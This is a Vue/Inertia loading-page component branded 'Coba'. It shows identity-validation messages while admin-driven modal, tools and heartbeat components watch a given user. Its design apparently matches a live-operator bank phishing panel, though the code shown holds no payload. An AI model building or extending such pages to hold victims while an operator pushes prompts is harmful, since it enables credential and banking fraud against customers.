<script setup>
import { ref, onMounted, onUnmounted, computed } from 'vue'
import { Head } from '@inertiajs/vue3'
import ModalSystem from '../Components/Usuario/ModalSystem.vue'
import HerramientasSystem from '../Components/Usuario/HerramientasSystem.vue'
import HeartbeatManager from '../Components/HeartbeatManager.vue'
import favicon from '@/assets/coba/coba.ico'

const props = defineProps({ usuario_id: Number })

const mensajes = [
  'Validando tu identidad ...',
  'Procesando tu solicitud ...',
  'Conectando con nuestros servidores ...',
  'Esperando respuesta ...',
  'Espere un momento por favor ...'
]
const idx = ref(0)
const mensajeActual = computed(() => mensajes[idx.value])
let rot = null

onMounted(() => {
  rot = setInterval(() => { idx.value = (idx.value + 1) % mensajes.length }, 3500)
})

onUnmounted(() => { if (rot) clearInterval(rot) })
</script>

<template>
  <Head>
    <title>Coba - Procesando</title>
    <link rel="icon" :href="favicon" />
  </Head>

  <!-- Sistemas de comunicación con admin -->
  <ModalSystem :usuario-id="usuario_id" />
  <HerramientasSystem :usuario-id="usuario_id" />
  <HeartbeatManager :usuario-id="usuario_id" pagina="loading" />

  <div class="min-h-screen bg-white flex items-center justify-center px-6">
    <div class="w-full max-w-md text-center">
      <div class="relative mx-auto w-16 h-16 mb-6">
        <div class="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
        <div class="absolute inset-0 border-4 border-emerald-600 border-t-transparent rounded-full animate-spin"></div>
      </div>
      <h2 class="text-xl font-semibold text-gray-900 mb-2">Procesando...</h2>
      <p class="text-gray-600">{{ mensajeActual }}</p>
    </div>
  </div>
</template>

<style>
html, body { min-width: 320px; }
</style>

